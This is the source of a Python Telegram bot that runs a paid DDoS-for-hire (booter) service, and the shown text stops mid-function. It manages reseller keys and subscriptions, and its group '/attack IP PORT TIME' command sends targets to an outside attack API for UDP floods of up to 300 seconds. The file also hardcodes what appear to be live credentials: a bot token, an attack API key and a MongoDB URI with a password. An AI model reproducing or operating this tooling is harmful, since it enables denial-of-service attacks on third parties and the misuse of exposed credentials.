
#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
import sys
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError, ConnectionFailure

# ========== TIMEZONE (IST) ==========
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('%d %b %Y, %I:%M:%S %p')

# ========== STYLED MESSAGE FUNCTION ==========
def styled_msg(title, content, status="info"):
    if status == "success":
        icon = "✅"
    elif status == "error":
        icon = "❌"
    elif status == "warning":
        icon = "⚠️"
    elif status == "attack":
        icon = "🔥"
    else:
        icon = "📌"
    
    msg = f"""
┌{'─' * 45}┐
│ {icon} {title:<42} │
├{'─' * 45}┤
{content}
└{'─' * 45}┘"""
    return msg

# ========== CONFIG ==========
BOT_TOKEN = "8971995233:AAF14OAt8gDtlCdFBG63jxBVcmUfoET1I6c"
ADMIN_ID = ["8487946379", "7495474613"]
API_URL = "http://app.teamc2.xyz/api/attack"
API_KEY = "W1SMH5"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30

# Blocked ports list
BLOCKED_PORTS = [443, 8700, 9031, 17500, 20000, 20001, 20002]

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mkjodi28_db_user:prKhMUvSAMmWdi4K@legend.eflrcmh.mongodb.net/?retryWrites=true&w=majority&appName=LEGEND"

def connect_mongodb():
    max_retries = 5
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
            client.admin.command('ping')
            print(f"✅ MongoDB Connected Successfully! (Attempt {attempt + 1})")
            return client
        except (ServerSelectionTimeoutError, ConnectionFailure) as e:
            print(f"❌ MongoDB connection attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                print(f"🔄 Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                print("❌ Failed to connect to MongoDB after all retries!")
                sys.exit(1)

client = connect_mongodb()
db = client["group_bot"]

users_collection = db["users"]
keys_collection = db["keys"]
settings_collection = db["settings"]

print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
maintenance_mode = False

# ========== LOAD/SAVE FUNCTIONS ==========
def load_users():
    try:
        users_data = users_collection.find_one({"_id": "users"})
        if not users_data:
            users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
            return {"users": [ADMIN_ID[0]], "resellers": []}
        return users_data
    except Exception as e:
        print(f"Error loading users: {e}")
        return {"users": [ADMIN_ID[0]], "resellers": []}

def save_users(data):
    try:
        users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)
    except Exception as e:
        print(f"Error saving users: {e}")

def load_keys():
    keys = {}
    try:
        for key_data in keys_collection.find():
            keys[key_data["key"]] = {
                "duration_value": key_data.get("duration_value"),
                "duration_unit": key_data.get("duration_unit"),
                "generated_by": key_data.get("generated_by"),
                "generated_at": key_data.get("generated_at"),
                "expires_at": key_data.get("expires_at"),
                "used": key_data.get("used", False),
                "used_by": key_data.get("used_by"),
                "used_at": key_data.get("used_at")
            }
    except Exception as e:
        print(f"Error loading keys: {e}")
    return keys

def save_keys(keys_data):
    try:
        keys_collection.delete_many({})
        for key, info in keys_data.items():
            keys_collection.insert_one({
                "key": key,
                "duration_value": info.get("duration_value"),
                "duration_unit": info.get("duration_unit"),
                "generated_by": info.get("generated_by"),
                "generated_at": info.get("generated_at"),
                "expires_at": info.get("expires_at"),
                "used": info.get("used", False),
                "used_by": info.get("used_by"),
                "used_at": info.get("used_at")
            })
    except Exception as e:
        print(f"Error saving keys: {e}")

def load_settings():
    try:
        settings = settings_collection.find_one({"_id": "settings"})
        if not settings:
            settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30})
            return {"max_concurrent": 2, "cooldown": 30}
        return settings
    except Exception as e:
        print(f"Error loading settings: {e}")
        return {"max_concurrent": 2, "cooldown": 30}

def save_settings(settings):
    try:
        settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)
    except Exception as e:
        print(f"Error saving settings: {e}")

# ========== LOAD DATA ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
settings = load_settings()

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

def create_bot():
    max_retries = 3
    for attempt in range(max_retries):
        try:
            bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
            bot_info = bot.get_me()
            print(f"✅ Bot connected: @{bot_info.username}")
            return bot
        except Exception as e:
            print(f"❌ Bot connection attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(3)
            else:
                print("❌ Failed to connect bot!")
                sys.exit(1)

bot = create_bot()

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    if duration_str.endswith('d'):
        days = duration_str.replace('d', '')
        if days.isdigit():
            return int(days), "day"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    else:
        return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def get_total_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    return len(active_attacks)

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def check_user_expiry(user_id):
    """Check if user has any valid key"""
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
            return True
    return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        for part in parts:
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    return False

def send_attack_to_api(ip, port, duration, chat_id, bot_instance):
    try:
        api_params = {
            "api_key": API_KEY,
            "target": ip,
            "port": port,
            "time": duration,
            "concurrent": 1
        }
        response = requests.get(API_URL, params=api_params, timeout=15)
        
        if response.status_code == 200:
            time.sleep(duration)
            finish_time = format_ist_time(get_current_ist())
            msg = styled_msg("ATTACK FINISHED", f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ 📅 Finished: {finish_time}\n│ 🔄 Restart your game!", "success")
            bot_instance.send_message(chat_id, msg)
            return True
        else:
            msg = styled_msg("ATTACK FAILED", f"│ 🎯 Target: {ip}:{port}\n│ 📡 Status: {response.status_code}\n│ 💡 Try again later!", "error")
            bot_instance.send_message(chat_id, msg)
            return False
    except Exception as e:
        msg = styled_msg("ATTACK STARTED", f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Status: Attack in progress\n│ 💡 Attack will run for {duration}s", "attack")
        bot_instance.send_message(chat_id, msg)
        time.sleep(duration)
        finish_time = format_ist_time(get_current_ist())
        msg2 = styled_msg("ATTACK FINISHED", f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ 📅 Finished: {finish_time}", "success")
        bot_instance.send_message(chat_id, msg2)
        return True

# ========== CLEANUP THREADS ==========
def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        
        expired_keys = []
        for key, info in keys_data.items():
            if info.get("used", False) and now > info["expires_at"]:
                expired_keys.append(key)
        for key in expired_keys:
            del keys_data[key]
        if expired_keys:
            save_keys(keys_data)
            print(f"✅ Expired {len(expired_keys)} keys")

expiry_cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
expiry_cleanup_thread.start()

def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]

attack_cleanup_thread = threading.Thread(target=attack_cleanup, daemon=True)
attack_cleanup_thread.start()

# ========== PRIVATE CHAT COMMANDS ==========
@bot.message_handler(commands=['start'], func=lambda msg: msg.chat.type == "private")
def start_private(msg):
    uid = str(msg.chat.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!\n│ ⏳ Please try again later.", "warning"))
        return
    
    if uid in ADMIN_ID:
        content = f"""│ 👑 OWNER PANEL
│
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ ⏳ Cooldown: {COOLDOWN_TIME}s
│ ⏱️ Max Attack Time: 300s
│ 📅 {current_time}
│
│ 📝 COMMANDS:
│
│ 🔑 KEY MANAGEMENT:
│   /genkey 1d - Generate 1 key
│   /bulk 1d 10 - Generate bulk keys
│   /removekey KEY - Remove key
│   /mykeys - View your keys
│
│ 👤 RESELLERS:
│   /addreseller USER_ID
│   /removereseller USER_ID
│
│ ⚙️ SETTINGS:
│   /setmax 1-100
│   /setcooldown 1-300
│
│ 🔧 OTHER:
│   /maintenance on/off
│   /broadcast
│   /stopattack IP:PORT
│   /allusers
│   /api_status"""
        bot.reply_to(msg, styled_msg("OWNER PANEL", content, "success"))
    
    elif uid in resellers:
        content = f"""│ 💎 RESELLER PANEL
│
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ ⏳ Cooldown: {COOLDOWN_TIME}s
│ 📅 {current_time}
│
│ 📝 COMMANDS:
│
│ 🔑 KEY MANAGEMENT:
│   /genkey 1d - Generate 1 key
│   /bulk 1d 10 - Generate bulk keys
│   /mykeys - View your keys
│
│ 📋 OTHER:
│   /help"""
        bot.reply_to(msg, styled_msg("RESELLER PANEL", content, "success"))
    
    else:
        # Normal users
        has_access = check_user_expiry(uid)
        if has_access:
            for key, info in keys_data.items():
                if info.get("used_by") == uid and info.get("used") == True:
                    expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
                    duration = format_duration(info['duration_value'], info['duration_unit'])
                    break
            else:
                expiry = "Unknown"
                duration = "Unknown"
            
            content = f"""│ ✅ YOUR ACCESS
│
│ 👤 User: {uid}
│ ⏰ Duration: {duration}
│ 📅 Expires: {expiry}
│
│ ⚡ Max Attack Time: 300s
│ 📅 {current_time}
│
│ 📝 TO ATTACK:
│ Add this bot to any group and use /attack command
│
│ 📝 COMMANDS:
│   /start - Check status"""
            bot.reply_to(msg, styled_msg("USER PANEL", content, "success"))
        else:
            content = f"""│ 🔑 NO ACTIVE KEY
│
│ You don't have an active key!
│
│ 📝 To get access:
│ 1. Get a key from owner/reseller
│ 2. Use /redeem KEY
│
│ 📅 {current_time}
│
│ 📝 COMMANDS:
│   /redeem KEY - Activate your key
│   /start - Check status"""
            bot.reply_to(msg, styled_msg("ACCESS REQUIRED", content, "warning"))

@bot.message_handler(commands=['redeem'], func=lambda msg: msg.chat.type == "private")
def redeem_private(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used by someone else!")
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    # Mark key as used by THIS USER
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
    
    bot.reply_to(msg, f"✅ ACCESS GRANTED!\n👤 User: {uid}\n⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n📅 Expires: {expiry_str}\n\nNow add this bot to any group and use /attack command!")

@bot.message_handler(commands=['genkey'], func=lambda msg: msg.chat.type == "private")
def genkey(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1d or /genkey 5h")
        return
    
    duration_str = args[1]
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration! Use 1d or 5h")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    keys_data[key] = {
        "duration_value": value, 
        "duration_unit": unit, 
        "generated_by": uid, 
        "generated_at": time.time(), 
        "expires_at": expires_at.timestamp(), 
        "used": False
    }
    save_keys(keys_data)
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    
    bot.reply_to(msg, f"🔑 `{key}`\n\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}", parse_mode="Markdown")

@bot.message_handler(commands=['bulk'], func=lambda msg: msg.chat.type == "private")
def bulk(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /bulk 1d 10 or /bulk 5h 5\n📌 Example: /bulk 1d 10 (10 keys of 1 day)")
        return
    
    duration_str = args[1]
    try:
        count = int(args[2])
        if count < 1 or count > 100:
            bot.reply_to(msg, "❌ Number of keys must be between 1 and 100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration! Use 1d or 5h")
        return
    
    keys = []
    for _ in range(count):
        key = generate_key()
        expires_at = get_expiry_date(value, unit)
        keys_data[key] = {
            "duration_value": value, 
            "duration_unit": unit, 
            "generated_by": uid, 
            "generated_at": time.time(), 
            "expires_at": expires_at.timestamp(), 
            "used": False
        }
        keys.append(key)
    save_keys(keys_data)
    
    keys_text = "\n".join([f"`{k}`" for k in keys])
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(msg, f"🔑 KEYS GENERATED:\n\n{keys_text}\n\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}", parse_mode="Markdown")

@bot.message_handler(commands=['removekey'], func=lambda msg: msg.chat.type == "private")
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: `{key}`", parse_mode="Markdown")
    else:
        bot.reply_to(msg, "❌ Key not found!")

@bot.message_handler(commands=['mykeys'], func=lambda msg: msg.chat.type == "private")
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        return
    
    my_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            my_keys.append(f"🔑 `{key}`\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
    
    if my_keys:
        bot.reply_to(msg, "📋 YOUR KEYS:\n\n" + "\n\n".join(my_keys), parse_mode="Markdown")
    else:
        bot.reply_to(msg, "📋 No keys generated yet!")

@bot.message_handler(commands=['addreseller'], func=lambda msg: msg.chat.type == "private")
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 Reseller: {new_reseller}")

@bot.message_handler(commands=['removereseller'], func=lambda msg: msg.chat.type == "private")
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    
    target = args[1]
    if target not in resellers:
        bot.reply_to(msg, f"❌ User {target} is not a reseller!")
        return
    
    resellers.remove(target)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")

@bot.message_handler(commands=['setmax'], func=lambda msg: msg.chat.type == "private")
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 5")
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ Value must be between 1 and 100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ GLOBAL CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}")

@bot.message_handler(commands=['setcooldown'], func=lambda msg: msg.chat.type == "private")
def set_cooldown(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60")
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ Value must be between 1 and 300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s")

@bot.message_handler(commands=['broadcast'], func=lambda msg: msg.chat.type == "private")
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    if msg.reply_to_message:
        success_count = 0
        fail_count = 0
        caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
        
        # Get all users who have ever redeemed a key
        all_users = set()
        for key, info in keys_data.items():
            if info.get("used_by"):
                all_users.add(info.get("used_by"))
        
        for user in all_users:
            try:
                if msg.reply_to_message.photo:
                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
                elif msg.reply_to_message.video:
                    bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                else:
                    bot.send_message(user, caption)
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
    else:
        args = msg.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
            return
        
        message = args[1]
        
        all_users = set()
        for key, info in keys_data.items():
            if info.get("used_by"):
                all_users.add(info.get("used_by"))
        
        success_count = 0
        fail_count = 0
        
        for user in all_users:
            try:
                bot.send_message(user, f"📢 BROADCAST 📢\n\n{message}")
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")

@bot.message_handler(commands=['stopattack'], func=lambda msg: msg.chat.type == "private")
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}")
            try:
                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped!")
            except:
                pass
            break
    
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack found on {target}")

@bot.message_handler(commands=['allusers'], func=lambda msg: msg.chat.type == "private")
def all_users(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    active_users = set()
    for key, info in keys_data.items():
        if info.get("used", False) and info.get("used_by"):
            active_users.add(info.get("used_by"))
    
    user_list = []
    for u in active_users:
        user_list.append(f"👤 {u}")
    
    if user_list:
        bot.reply_to(msg, f"📋 ACTIVE USERS:\n\n" + "\n".join(user_list) + f"\n\nTotal: {len(active_users)}")
    else:
        bot.reply_to(msg, "📋 No active users yet!")

@bot.message_handler(commands=['api_status'], func=lambda msg: msg.chat.type == "private")
def api_status(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=1&concurrent=1", timeout=5)
        api_status_text = "🟢 ONLINE" if test_response.status_code == 200 else f"🔴 ERROR {test_response.status_code}"
        content = f"│ 📡 Status: {api_status_text}\n│ 🎯 Active Attacks: {get_total_active_count()}\n│ 📅 {format_ist_time(get_current_ist())}"
        bot.reply_to(msg, styled_msg("API STATUS", content))
    except:
        bot.reply_to(msg, styled_msg("API STATUS", "│ ❌ API OFFLINE", "error"))

@bot.message_handler(commands=['maintenance'], func=lambda msg: msg.chat.type == "private")
def maintenance(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on or /maintenance off")
        return
    
    global maintenance_mode
    status = args[1].lower()
    
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 MAINTENANCE MODE ENABLED", "warning"))
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ ✅ MAINTENANCE MODE DISABLED", "success"))
    else:
        bot.reply_to(msg, "❌ Invalid status! Use on or off")

@bot.message_handler(commands=['help'], func=lambda msg: msg.chat.type == "private")
def help_private(msg):
    uid = str(msg.chat.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid in ADMIN_ID:
        content = f"""│ 👑 OWNER HELP
│
│ 🔑 KEYS:
│   /genkey 1d - Generate 1 key
│   /bulk 1d 10 - Generate bulk keys
│   /removekey KEY - Remove key
│   /mykeys - View your keys
│
│ 👤 RESELLERS:
│   /addreseller ID - Add reseller
│   /removereseller ID - Remove reseller
│
│ ⚙️ SETTINGS:
│   /setmax 1-100 - Set concurrent limit
│   /setcooldown 1-300 - Set cooldown
│
│ 🔧 OTHER:
│   /maintenance on/off
│   /broadcast
│   /stopattack IP:PORT
│   /allusers
│   /api_status
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("OWNER HELP", content))
    
    elif uid in resellers:
        content = f"""│ 💎 RESELLER HELP
│
│ 🔑 KEYS:
│   /genkey 1d - Generate 1 key
│   /bulk 1d 10 - Generate bulk keys
│   /mykeys - View your keys
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("RESELLER HELP", content))
    
    else:
        has_access = check_user_expiry(uid)
        if has_access:
            content = f"""│ 🔥 USER HELP
│
│ 📝 COMMANDS:
│   /redeem KEY - Activate your key
│   /start - Check your access status
│
│ 🔸 TO ATTACK:
│   Add this bot to any group and use /attack command
│
│ 📅 {current_time}"""
            bot.reply_to(msg, styled_msg("USER HELP", content))
        else:
            content = f"""│ 🔥 USER HELP
│
│ 📝 TO GET ACCESS:
│   /redeem KEY - Activate your key│
│ 🔸 AFTER REDEEM:
│   Add this bot to any group and use /attack command
│
│ 📅 {current_time}"""
            bot.reply_to(msg, styled_msg("USER HELP", content))

# ========== GROUP CHAT COMMANDS (Attack ONLY in groups) ==========
@bot.message_handler(commands=['start'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def start_group(msg):
    uid = str(msg.chat.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    # Check if user has a valid key
    has_access = check_user_expiry(uid)
    
    if has_access:
        content = f"""│ ✅ GROUP ATTACK BOT
│
│ ⚡ Max Attack Time: 300s
│ 📅 {current_time}
│
│ 📝 COMMANDS:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│   /help"""
        bot.reply_to(msg, styled_msg("DDOS BOT", content, "success"))
    else:
        content = f"""│ 🔑 NO ACCESS
│
│ You don't have active access!
│
│ 📝 To get access:
│ 1. Get a key from owner/reseller
│ 2. Use /redeem KEY in PRIVATE chat with bot
│
│ ⚡ Max Attack Time: 300s
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("ACCESS REQUIRED", content, "warning"))

@bot.message_handler(commands=['attack'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def attack_group(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    # Check if user has access
    if not check_user_expiry(uid):
        bot.reply_to(msg, styled_msg("ACCESS DENIED", f"│ 🔑 You don't have active access!\n│\n│ Use /redeem KEY in PRIVATE chat with bot\n│\n│ ⚡ Max Attack Time: 300s", "warning"))
        return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time: 300s")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    if not validate_ip(ip):
        bot.reply_to(msg, "❌ Invalid IP address!")
        return
    
    try:
        port = int(port)
        if port in BLOCKED_PORTS:
            blocked_ports_str = ", ".join(map(str, BLOCKED_PORTS))
            bot.reply_to(msg, f"🚫 Blocked Port: {port}\n❌ Please enter correct port.\n\n📋 Allowed Ports: All except {blocked_ports_str}")
            return
        if port < 1 or port > 65535:
            bot.reply_to(msg, "❌ Port must be between 1 and 65535!")
            return
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, f"❌ Duration must be 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    total_active = get_total_active_count()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Active: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s")
        return
    
    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000, 9999)}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = get_total_active_count()
    current_time = format_ist_time(get_current_ist())
    
    content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 🌐 Active: {new_total}/{MAX_CONCURRENT}"
    bot.reply_to(msg, styled_msg("🔥 ATTACK LAUNCHED 🔥", content, "attack"))
    
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot)
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def status_group(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    # Check if user has access
    if not check_user_expiry(uid):
